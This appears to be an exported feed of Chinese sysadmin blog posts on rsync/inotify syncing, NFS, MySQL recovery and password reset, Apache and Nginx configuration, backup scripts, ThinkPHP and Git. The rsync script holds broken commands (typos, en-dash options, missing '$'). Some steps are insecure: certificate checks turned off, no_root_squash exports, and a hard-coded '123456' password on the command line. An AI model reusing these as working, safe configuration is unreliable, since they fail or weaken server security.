 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget http://github.com/downloads/rvoicilas/inotify-tools/inotify-tools-3.14.tar.gz --no-check-certificate</span><br><span class="line">tar -zxvf inotify-tools-3.14.tar.gz</span><br><span class="line">makedir /usr/local/inotify</span><br><span class="line">cd inotify-tools-3.14.tar.gz</span><br><span class="line">./configure --prefix=/usr/local/inotify</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看是否安装成功</span></span><br><span class="line">ls -alh /usr/local/inotify/bin/inotify*</span><br><span class="line"><span class="meta">#</span><span class="bash"> 建立软连接</span></span><br><span class="line">ln -s /usr/local/inotify/bin/inotifywait /usr/bin/inotifywait</span><br><span class="line">ln -s /usr/local/inotify/bin/inotifywatch /usr/bin/inotifywatch</span><br></pre></td></tr></table></figure>
</li>
<li><p>配置rsync.sh同步监控脚本</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vi /root/rsync.sh</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 内容如下</span></span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">src=/home/wwwroot/</span><br><span class="line">des=master_web #视情况自己配置，注意与下面的rsync命令结合配置</span><br><span class="line">user=rsync</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">多个ip就用空格间断,所有IP用一个双引号包起来</span></span><br><span class="line">host="192.168.10.230"</span><br><span class="line">/usr/bin/inotifywait -mrq –exclude=public –exclude=themes –exclude=wap_themes –timefmt '%d/%m/%y %H:%M' –format '%T %w%f' -e modify,delete,create,attrib src | while read file</span><br><span class="line">do</span><br><span class="line">    for hostip in host</span><br><span class="line">    do</span><br><span class="line">        rsync -vzrtopg –delete –progress –exclude=themes –exclude=wap_themes –exclude=public &#123;src&#125; &#123;user&#125;@&#123;hostip&#125;::&#123;des&#125; –password-file=/root/rsyncd.passwd</span><br><span class="line">        echo "$&#123;file&#125; was rsynced" &gt;&gt; /tmp/rsync.log 2&gt;&amp;1</span><br><span class="line">    done</span><br><span class="line">done</span><br></pre></td></tr></table></figure>
</li>
<li><p>给rsync.sh脚本赋可执行权限</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">chmod +x /root/rsync.sh</span><br></pre></td></tr></table></figure>
</li>
<li><p>运行rsync.sh同步监控脚本和配置守护进程</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nohup sh /root/rsync.sh &amp;</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">建立守护进程运行rsync.sh脚本</span></span><br><span class="line">echo “nohup sh /root/rsync.sh &amp;” &gt;&gt; /etc/rc.local</span><br></pre></td></tr></table></figure>
</li>
</ol>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>多机部署</tag>
        <tag>rsync+inotify</tag>
        <tag>双向实时同步代码</tag>
      </tags>
  </entry>
  <entry>
    <title>多机部署之NFS的安装与配置</title>
    <url>/2018/01/01/16.html</url>
    <content><![CDATA[<p>NFS即网络文件系统，说的通俗一点就是网络共享文件。它能够让不同的服务器共享同一个资源，这个在集群部署中普遍运用。</p>
<a id="more"></a>
<ol>
<li><p>安装nfs</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum install -y nfs-utils</span><br><span class="line">yum install -y rpcbind #适用centos 6</span><br><span class="line">yum install -y portmap #适用centos 5</span><br></pre></td></tr></table></figure></li>
<li><p>启动NFS服务，一定要先启动rpcbind，后启动nfs</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/etc/init.d/rpcbind start</span><br><span class="line">/etc/init.d/nfs start</span><br></pre></td></tr></table></figure></li>
<li><p>在资源服务器（服务器端）上配置NFS，修改 <code>/etc/exports</code></p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/data/httpd/www/public 客户端ip（rw,sync,no_root_squash）</span><br><span class="line">/data/httpd/www/themes 客户端ip（rw,sync,no_root_squash）</span><br><span class="line">/data/httpd/www/wap_themes 客户端ip（rw,sync,no_root_squash）</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">修改好之后执行命令</span></span><br><span class="line">exportfs -rv</span><br></pre></td></tr></table></figure>

<p> 查看是否成功</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">showmount -e 服务器端ip</span><br><span class="line">Export list for 服务器端ip</span><br><span class="line">/data/httpd/www/public 客户端ip</span><br><span class="line">/data/httpd/www/themes 客户端ip</span><br><span class="line">/data/httpd/www/wap_themes 客户端ip</span><br></pre></td></tr></table></figure></li>
<li><p>web服务器（客户端）挂载资源服务器的资源</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mount 服务器端ip:/data/httpd/www/public /data/httpd/www/public</span><br><span class="line">mount 服务器端ip:/data/httpd/www/themes /data/httpd/www/themes</span><br><span class="line">mount 服务器端ip:/data/httpd/www/wap_themes /data/httpd/www/wap_themes</span><br></pre></td></tr></table></figure></li>
<li><p>防止重启服务器忘记挂载</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vi /etc/rc.local</span><br><span class="line">mount 服务器端ip:/data/httpd/www/public /data/httpd/www/public</span><br><span class="line">mount 服务器端ip:/data/httpd/www/themes /data/httpd/www/themes</span><br><span class="line">mount 服务器端ip:/data/httpd/www/wap_themes /data/httpd/www/wap_themes</span><br></pre></td></tr></table></figure></li>
<li><p>重启服务</p>
<blockquote>
<p>先启动：service rpcbind start 再启动：service nfs start<br>先关闭：service nfs stop 再关闭：service rpcbind stop</p>
</blockquote>
</li>
</ol>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>多机部署</tag>
        <tag>NFS</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL无法重启的情况下备份数据库</title>
    <url>/2018/04/15/19.html</url>
    <content><![CDATA[<p>MySQL无法重启，报如下错误</p>
<blockquote>
<p>The server quit without updating PID file (/usr/local/var/mysql/abcdefghijk.pid).</p>
</blockquote>
<a id="more"></a>
<h2 id="查看错误日志"><a href="#查看错误日志" class="headerlink" title="查看错误日志"></a>查看错误日志</h2><p>根据提示大约在 <code>/usr/local/var/mysql</code> 下有个错误报告文件，内容如下</p>
<blockquote>
<p>InnoDB: The error means the system cannot find the path specified.<br>InnoDB: If you are installing InnoDB, remember that you must create</p>
</blockquote>
<p>大约这种报错，意思是innodb出现问题导致MySQL启动失败</p>
<h2 id="处理方式"><a href="#处理方式" class="headerlink" title="处理方式"></a>处理方式</h2><ol>
<li><p>如果数据不重要或者已经备份，只需要恢复MySQL启动<br> ① 进入MySQL目录，一般是：<code>/usr/local/var/mysql</code><br> ② 删除 <code>ib_logfile\*</code><br> ③ 删除 <code>ibdata\*</code><br> ④ 删除所有数据库物理目录（例如：数据库为<code>test_db</code>,则执行 <code>rm -rf test_db</code>）<br> ⑤ 重启MySQL，重新建立数据库或者使用备份覆盖</p>
</li>
<li><p>如果数据很重要且没有备份<br> ① 使用 <code>innodb_force _recovery</code> 参数，使MySQL跳过恢复步骤，启动MySQL，将数据库导出然后进行其它操作<br> ② 在 <code>my.cnf</code> 文件中加入</p>
<blockquote>
<p>innodb_force_recovery = 6<br>innodb_purge_thread = 0</p>
</blockquote>
<p> ③ 重启MySQL<br> ④ 进行导出操作，备份数据库</p>
</li>
</ol>
]]></content>
      <categories>
        <category>MySQL</category>
      </categories>
      <tags>
        <tag>数据库备份</tag>
      </tags>
  </entry>
  <entry>
    <title>修改MySql数据库密码</title>
    <url>/2017/09/17/2.html</url>
    <content><![CDATA[<p>笔者记性不太好，所以忘记密码是常有的事情。这不连数据库的密码也忘了。下面就来介绍一下如何暴力地修改数据库密码。</p>
<a id="more"></a>
<ol>
<li>修改MySql的登录设置，保存退出</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vi /etc/my.cnf</span><br><span class="line"><span class="meta">#</span><span class="bash">在[mysqld]的内容段中加入一句</span></span><br><span class="line">skip-grant-tables</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>重新启动数据库</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/etc/init.d/mysql restart</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>登录并修改MySQL数据库的密码</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mysql -uroot</span><br><span class="line">mysql &gt;use mysql;</span><br><span class="line">mysql &gt;update user set Password = password ('123456') where User = 'root';</span><br><span class="line">mysql &gt;exit;</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>还原MySql的登录设置</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vi /etc/my.cnf</span><br><span class="line">[注释掉原先新增的配置项] skip-grant-tables</span><br></pre></td></tr></table></figure>

<ol start="5">
<li>重启MySQL并用新密码登录</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/etc/init.d/mysql restart</span><br><span class="line">mysql -uroot -p123456</span><br></pre></td></tr></table></figure>

<hr>
<p>参考文章：<a href="https://www.cnblogs.com/52php/p/5675258.html" target="_blank" rel="noopener">https://www.cnblogs.com/52php/p/5675258.html</a></p>
]]></content>
      <categories>
        <category>MySQL</category>
      </categories>
      <tags>
        <tag>数据库</tag>
        <tag>修改密码</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu系统下配置Apache虚拟主机</title>
    <url>/2018/05/24/21.html</url>
    <content><![CDATA[<p>Ubuntu系统下安装了Apache服务，想要通过IP、域名、端口访问多个Web应用。</p>
<a id="more"></a>
<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><blockquote>
<p>此教程适合apt-get install apache2安装的apache</p>
</blockquote>
<h2 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h2><ol>
<li><p>进入配置文件目录</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd /etc/apache2/</span><br></pre></td></tr></table></figure>
</li>
<li><p>配置文件说明</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apache2.conf  #apache总的配置文件</span><br><span class="line">ports.conf    #端口配置文件</span><br><span class="line">sites-enables/000-default.conf    #虚拟主机配置文件</span><br></pre></td></tr></table></figure>

</li>
</ol>
<h2 id="配置多个虚拟主机"><a href="#配置多个虚拟主机" class="headerlink" title="配置多个虚拟主机"></a>配置多个虚拟主机</h2><ol>
<li><p>使用不同的端口访问网站的不同目录</p>
<ul>
<li>新增目录 <code>/var/www/html1</code> ,新增文件<code>/var/www/html1/index.php</code>（index.php文件内容自定）</li>
<li>修改 <code>ports.conf</code> 文件，新增内容如下<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Listen 8006</span><br></pre></td></tr></table></figure>
效果如图：<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly93eDIuc2luYWltZy5jbi9tdzY5MC8wMDZvbGsybmd5MWZybXVrdDN0MnhqMzBuNzA4cmpydi5qcGc?x-oss-process=image/format,png" alt=""></li>
<li>修改 <code>sites-enables/000-default.conf</code> 文件，新增内容如下<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"> &lt;VirtualHost *:8006&gt;</span><br><span class="line">        ServerName 192.168.0.109</span><br><span class="line">        ServerAdmin webmaster@localhost</span><br><span class="line">        DocumentRoot /var/www/html1</span><br><span class="line"></span><br><span class="line">        ErrorLog $&#123;APACHE_LOG_DIR&#125;/error80.log</span><br><span class="line">        CustomLog $&#123;APACHE_LOG_DIR&#125;/access80.log combined</span><br><span class="line">&lt;/VirtualHost&gt;</span><br></pre></td></tr></table></figure>
内容如图：<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly93eDQuc2luYWltZy5jbi9tdzY5MC8wMDZvbGsybmd5MWZybXVxcnYycnZqMzBydTBqZDQwcy5qcGc?x-oss-process=image/format,png" alt=""></li>
<li>重启apache2<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/etc/init.d/apache2 restart</span><br></pre></td></tr></table></figure></li>
<li>访问 ( IP:8006 ) , 效果如下图<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly93eDIuc2luYWltZy5jbi9tdzY5MC8wMDZvbGsybmd5MWZybXVrdGhrcXFqMzBmMzA3Ymdsbi5qcGc?x-oss-process=image/format,png" alt=""></li>
</ul>
</li>
<li><p>使用域名访问网站的不同目录</p>
<ul>
<li>修改本地host文件, 自定义一个域名, 指向服务器<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly93eDMuc2luYWltZy5jbi9tdzY5MC8wMDZvbGsybmd5MWZybXVrdHRqZ3NqMzBjdzA2N3dlaC5qcGc?x-oss-process=image/format,png" alt=""></li>
<li>修改 <code>sites-enables/000-default.conf</code> 文件，新增内容如下<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"> &lt;VirtualHost *:80&gt;</span><br><span class="line">        ServerName abcd.com</span><br><span class="line">        ServerAdmin webmaster@localhost</span><br><span class="line">        DocumentRoot /var/www/html1</span><br><span class="line"></span><br><span class="line">        ErrorLog $&#123;APACHE_LOG_DIR&#125;/error801.log</span><br><span class="line">        CustomLog $&#123;APACHE_LOG_DIR&#125;/access801.log combined</span><br><span class="line">&lt;/VirtualHost&gt;</span><br></pre></td></tr></table></figure>
内容如图：<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly93eDIuc2luYWltZy5jbi9tdzY5MC8wMDZvbGsybmd5MWZybXVxc2c4bDBqMzBvczBhN2pzYy5qcGc?x-oss-process=image/format,png" alt=""></li>
<li>访问（<code>http://abcd.com</code>）, 效果如下图<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly93eDEuc2luYWltZy5jbi9tdzY5MC8wMDZvbGsybmd5MWZybXVrdTUxdjRqMzBkbTA2ZmdsbC5qcGc?x-oss-process=image/format,png" alt=""></li>
</ul>
</li>
</ol>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Apache</tag>
        <tag>Ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title>Nginx配置--区分PC和WAP访问不同域名</title>
    <url>/2018/01/13/18.html</url>
    <content><![CDATA[<p>考虑到网站在多种设备下的兼容性，有很多网站会有手机版和电脑版两个版本。访问同一个网站URL，当服务器识别出用户使用电脑访问，就打开电脑版的页面，如果使用手机访问，就会得到手机版的页面。</p>
<a id="more"></a>
<p>要想让网站适配PC和WAP，首先要能做出准确的判断。HTTP请求的Header中的User-Agent可以区分客户端的浏览器类型，可以通过User-Agen来判断客户端的设备。<br><strong>下面举一个PC链接在WAP访问的例子：</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">location / &#123;</span><br><span class="line">    if ( $http_user_agent ~ "(MIDP)|(WAP)|(UP.Browser)|(Smartphone)|(Obigo)|(Mobile)|(AU.Browser)|(wxd.Mms)|(WxdB.Browser)|(CLDC)|(UP.Link)|(KM.Browser)|(UCWEB)|(SEMC-Browser)|(Mini)|(Symbian)|(Palm)|(Nokia)|(Panasonic)|(MOT-)|(SonyEricsson)|(NEC-)|(Alcatel)|(Ericsson)|(BENQ)|(BenQ)|(Amoisonic)|(Amoi-)|(Capitel)|(PHILIPS)|(SAMSUNG)|(Lenovo)|(Mitsu)|(Motorola)|(SHARP)|(WAPPER)|(LG-)|(LG/)|(EG900)|(CECT)|(Compal)|(kejian)|(Bird)|(BIRD)|(G900/V1.0)|(Arima)|(CTL)|(TDG)|(Daxian)|(DAXIAN)|(DBTEL)|(Eastcom)|(EASTCOM)|(PANTECH)|(Dopod)|(Haier)|(HAIER)|(KONKA)|(KEJIAN)|(LENOVO)|(Soutec)|(SOUTEC)|(SAGEM)|(SEC-)|(SED-)|(EMOL-)|(INNO55)|(ZTE)|(iPhone)|(Android)|(Windows CE)|(Wget)|(Java)|(curl)|(Opera)" ) &#123;</span><br><span class="line">        rewrite ^/(.*)$ http://m.nsxsg.com/wap/$1 last;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (!-e $request_filename) &#123;</span><br><span class="line">        rewrite  ^/(.*)$  /index.php/$1  last;</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>接下来解释一下其中的几个关键点：</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">location / &#123;&#125; #匹配所有的请求</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash">http_user_agent ~ “(一堆WAP匹配)” <span class="comment">#判断是wap</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash">http_user_agent !~ “(一堆WAP匹配)” <span class="comment">#判断不是wap</span></span></span><br><span class="line"></span><br><span class="line">rewrite regex replacement [flag] #rewrite重写，regex正则，replacement替换的内容，flag标志位（详情自行百度这里用last就可以了）</span><br></pre></td></tr></table></figure>

<p>上述内容用一句话概括：</p>
<blockquote>
<p>匹配所有请求，如果客户端是wap，重写域名斜杠后面的所有内容为<a href="http://m.nsxsg.com/wap/......，即（类似于把http://www.nsxsg.com/member.html重写为http://m.nsxsg.com/wap/member.html）" target="_blank" rel="noopener">http://m.nsxsg.com/wap/......，即（类似于把http://www.nsxsg.com/member.html重写为http://m.nsxsg.com/wap/member.html）</a></p>
</blockquote>
<p>WAP链接在PC访问的具体配置自行修改。</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>NGINX</tag>
        <tag>配置文件</tag>
      </tags>
  </entry>
  <entry>
    <title>脚本备份Shell</title>
    <url>/2018/05/10/20.html</url>
    <content><![CDATA[<p>分享一下，备份数据库、项目、日志的shell脚本。</p>
<a id="more"></a>
<h2 id="Nginx备份脚本"><a href="#Nginx备份脚本" class="headerlink" title="Nginx备份脚本"></a>Nginx备份脚本</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="keyword">function</span>:cut nginx <span class="built_in">log</span> files <span class="keyword">for</span> lnmp v0.5 and v0.6</span></span><br><span class="line"><span class="meta">#</span><span class="bash">author: https://lnmp.org</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#######</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash">配置项<span class="comment">#</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#######</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="built_in">set</span> the path to nginx <span class="built_in">log</span> files(nginx日志目录)</span></span><br><span class="line">log_files_path="/home/wwwlogs/"</span><br><span class="line"><span class="meta">#</span><span class="bash">nginx日志目录以年月日存放即(nginx日志存放目录/2017/09.....)</span></span><br><span class="line">log_files_dir=$&#123;log_files_path&#125;$(date -d "yesterday" +"%Y")/$(date -d "yesterday" +"%m")</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="built_in">set</span> nginx <span class="built_in">log</span> files you want to cut(nginx日志文件名称,满足多个名称,每个名称之间用空格隔开)</span></span><br><span class="line">log_files_name=(nsxsg_access)</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="built_in">set</span> the path to nginx.(nginx启动文件)</span></span><br><span class="line">nginx_sbin="/usr/local/nginx/sbin/nginx"</span><br><span class="line"><span class="meta">#</span><span class="bash">Set how long you want to save(日志保存天数)</span></span><br><span class="line">save_days=120</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">###########################################</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash">Please <span class="keyword">do</span> not modify the following script <span class="comment">#</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">###########################################</span></span></span><br><span class="line">mkdir -p $log_files_dir</span><br><span class="line">log_files_num=$&#123;#log_files_name[@]&#125;</span><br><span class="line"><span class="meta">#</span><span class="bash">cut nginx <span class="built_in">log</span> files</span></span><br><span class="line">for((i=0;i&lt;$log_files_num;i++));do</span><br><span class="line">mv $&#123;log_files_path&#125;$&#123;log_files_name[i]&#125;.log $&#123;log_files_dir&#125;/$&#123;log_files_name[i]&#125;_$(date -d "yesterday" +"%Y%m%d").log</span><br><span class="line">done</span><br><span class="line"><span class="meta">#</span><span class="bash">delete 30 days ago nginx <span class="built_in">log</span> files</span></span><br><span class="line">find $log_files_path -mtime +$save_days -exec rm -rf &#123;&#125; \;</span><br><span class="line"><span class="meta">$</span><span class="bash">nginx_sbin -s reload</span></span><br></pre></td></tr></table></figure>

<h2 id="项目备份脚本"><a href="#项目备份脚本" class="headerlink" title="项目备份脚本"></a>项目备份脚本</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"><span class="meta">#</span><span class="bash">author:1072966772@qq.com</span></span><br><span class="line"><span class="meta">#</span><span class="bash">time:2017-09-29</span></span><br><span class="line"><span class="meta">#</span><span class="bash">项目备份脚本</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#############</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 配置项内容 <span class="comment">#</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#############</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">set</span> the path to project 项目的根目录</span></span><br><span class="line">project_path="/home/wwwroot"</span><br><span class="line"><span class="meta">#</span><span class="bash"> 存放备份文件的目录</span></span><br><span class="line">backup_path="/data/backup"</span><br><span class="line"><span class="meta">#</span><span class="bash"> 需要备份的项目名称</span></span><br><span class="line">project_name="wordpress"</span><br><span class="line"><span class="meta">#</span><span class="bash"> 备份文件名</span></span><br><span class="line">backup_name="wordpress"</span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">set</span> how long you want to save</span></span><br><span class="line">save_days=30</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">##########################################</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash">Please <span class="keyword">do</span> not modify the following script<span class="comment">#</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">##########################################</span></span></span><br><span class="line">cd $&#123;project_path&#125;</span><br><span class="line">/bin/tar -zcvpf $&#123;backup_path&#125;/$&#123;backup_name&#125;_$(date +%Y%m%d).tar.gz $&#123;project_name&#125;</span><br><span class="line">find $&#123;backup_path&#125; -type f -mtime +$&#123;save_days&#125; -exec rm -rf &#123;&#125; \;</span><br></pre></td></tr></table></figure>

<h2 id="数据库备份脚本"><a href="#数据库备份脚本" class="headerlink" title="数据库备份脚本"></a>数据库备份脚本</h2><pre><code class="shell"><span class="meta">#</span><span class="bash">!/bin/bash</span>
<span class="meta">#</span><span class="bash">author:1072966772@qq.com</span>
<span class="meta">#</span><span class="bash">time:2017-09-29</span>
<span class="meta">#</span><span class="bash">数据库备份脚本</span>

<span class="meta">#</span><span class="bash"><span class="comment">#############</span></span>
<span class="meta">#</span><span class="bash"> 配置项内容 <span class="comment">#</span></span>
<span class="meta">#</span><span class="bash"><span class="comment">#############</span></span>
<span class="meta">#</span><span class="bash"> 存放数据库备份文件的目录</span>
backup_path="/data/backup/databasebackup"
<span class="meta">#</span><span class="bash"> 数据库主机</span>
mysql_host="localhost"
<span class="meta">#</span><span class="bash"> 数据库用户</span>
mysql_user="root"
<span class="meta">#</span><span class="bash"> 数据库密码</span>
mysql_pwd="123456"
<span class="meta">#</span><span class="bash"> 数据库名称</span>
mysql_name="wordpress"
<span class="meta">#</span><span class="bash"> 备份文件名</span>
backup_name="wpdatabase"
<span class="meta">#</span><span class="bash"> <span class="built_in">set</span> how long you want to save</span>
save_days=30

<span class="meta">#</span><span class="bash"><span class="comment">##########################################</span></span>
<span class="meta">#</span><span class="bash">Please <span class="keyword">do</span> not modify the following script<span class="comment">#</span></span>
<span class="meta">#</span><span class="bash"><span class="comment">##########################################</span></span>
cd ${backup_path}
/usr/bin/mysqldump -h ${mysql_host} -u ${mysql_user} --password=${mysql_pwd}  ${mysql_name} &gt; ${backup_path}/${backup_name}_$(date +%Y%m%d).sql
/bin/gzip -1 ${backup_name}_$(date +%Y%m%d).sql
find ${backup_path} -type f -mtime +${save_days} -exec rm -rf {} \;</code></pre>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>shell脚本</tag>
        <tag>定时</tag>
      </tags>
  </entry>
  <entry>
    <title>ThinkPHP5.0模型之基础篇</title>
    <url>/2018/07/05/22.html</url>
    <content><![CDATA[<p>使用ThinkPHP5.0的模型，进行基本的增删改查操作。</p>
<a id="more"></a>
<h2 id="定义和初始化模型"><a href="#定义和初始化模型" class="headerlink" title="定义和初始化模型"></a>定义和初始化模型</h2><pre><code>1. 新建数据库表girls，插入数据
2. 在application/index/model目录下新建一个Girls.php文件
3. 设置数据表
4. 模型初始化  </code></pre><p>效果如图：  </p>
<p><img src="https://imgconvert.csdnimg.cn/aHR0cDovL3d4NC5zaW5haW1nLmNuL2xhcmdlLzAwNm9sazJubHkxZnN3ZzB5dTdvYmozMHBtMGQ3bXliLmpwZw?x-oss-process=image/format,png" alt="image"></p>
<h2 id="查询"><a href="#查询" class="headerlink" title="查询"></a>查询</h2><pre><code>1. 查询单个数据
2. 查询多个数据（无法使用toArray，请查看，模型中自定义数据集对象）
3. 查询所有数据
4. 使用闭包查询指定字段</code></pre><p>效果如图：</p>
<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly93eDEuc2luYWltZy5jbi9sYXJnZS8wMDZvbGsybmx5MWZzd2hmZTM4anRqMzBzMDBpa2dubS5qcGc?x-oss-process=image/format,png" alt="image"></p>
<h2 id="新增"><a href="#新增" class="headerlink" title="新增"></a>新增</h2><pre><code>1. 添加一条数据
2. 添加多条数据（查手册）</code></pre><p>效果如图：</p>
<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly93eDEuc2luYWltZy5jbi9sYXJnZS8wMDZvbGsybmx5MWZzd2oyOW4xMjNqMzB0ejBmYWduNS5qcGc?x-oss-process=image/format,png" alt="image"></p>
<h2 id="修改"><a href="#修改" class="headerlink" title="修改"></a>修改</h2><pre><code>1. 更新过滤后的数据
2. 其它更新（查手册）</code></pre><p>效果如图：</p>
<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly93eDEuc2luYWltZy5jbi9sYXJnZS8wMDZvbGsybmx5MWZzd2tidGp6b3hqMzBzbTBmaTc1cy5qcGc?x-oss-process=image/format,png" alt="image"></p>
<h2 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h2><pre><code>1. 根据主键删除
2. 其它删除（查手册）</code></pre><p>效果如图：</p>
<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly93eDMuc2luYWltZy5jbi9sYXJnZS8wMDZvbGsybmx5MWZzd2trZnFuZW1qMzBsaDBkZ2dtbC5qcGc?x-oss-process=image/format,png" alt="image"></p>
]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>ThinkPHP框架</tag>
        <tag>模型</tag>
      </tags>
  </entry>
  <entry>
    <title>Git使用之开发者</title>
    <url>/2018/10/18/23.html</url>
    <content><![CDATA[<p>近年来Git的热度居高不下，本文是笔者对Git的一些常用命令做的记录。</p>
<a id="more"></a>
<h2 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git init</span><br><span class="line"># 初始化本地仓库</span><br><span class="line"></span><br><span class="line">git remote add &lt;remote&gt; &lt;url&gt;</span><br><span class="line"># 添加远程版本库，remote可自行取名，默认origin，url为远程仓库的HTTPS或者SSH地址</span><br><span class="line"></span><br><span class="line">git remote -v</span><br><span class="line"># 查看远程版本库信息</span><br><span class="line"></span><br><span class="line">git remote remove &lt;remote&gt;</span><br><span class="line"># 删除远程remote链接</span><br><span class="line"></span><br><span class="line">git pull &lt;remote&gt; &lt;branch&gt;</span><br><span class="line"># 下载代码及快速合并 remote为添加的版本库别名，branch可以是dev:master（dev为远端分支，master为本地分支）</span><br></pre></td></tr></table></figure>
<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly93eDMuc2luYWltZy5jbi9tdzY5MC8wMDZvbGsybmx5MWZ0NGtjajdkcm5qMzBoMzBhdWdtYS5qcGc?x-oss-process=image/format,png" alt="image"></p>
<h2 id="代码拉取和推送"><a href="#代码拉取和推送" class="headerlink" title="代码拉取和推送"></a>代码拉取和推送</h2><ul>
<li><p><strong>每天开发之前需要先拉取一遍远程版本库的代码</strong>  </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git fetch &lt;remote&gt; &lt;branch&gt;</span><br><span class="line"># 将远端库获取到本地但不合并，remote为添加的版本库别名，branch为远端的分支名</span><br><span class="line"></span><br><span class="line">git merge &lt;branch&gt;</span><br><span class="line"># 将获取的远端分支合并到本地目前所在的分支</span><br></pre></td></tr></table></figure>
<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly93eDMuc2luYWltZy5jbi9tdzY5MC8wMDZvbGsybmx5MWZ0NGtjam9leWdqMzBmdDA5bHEzZi5qcGc?x-oss-process=image/format,png" alt="image"></p>
</li>
<li><p><strong>每天开发完成后进行代码提交（需要再次进行线上的拉取）</strong>  </p>
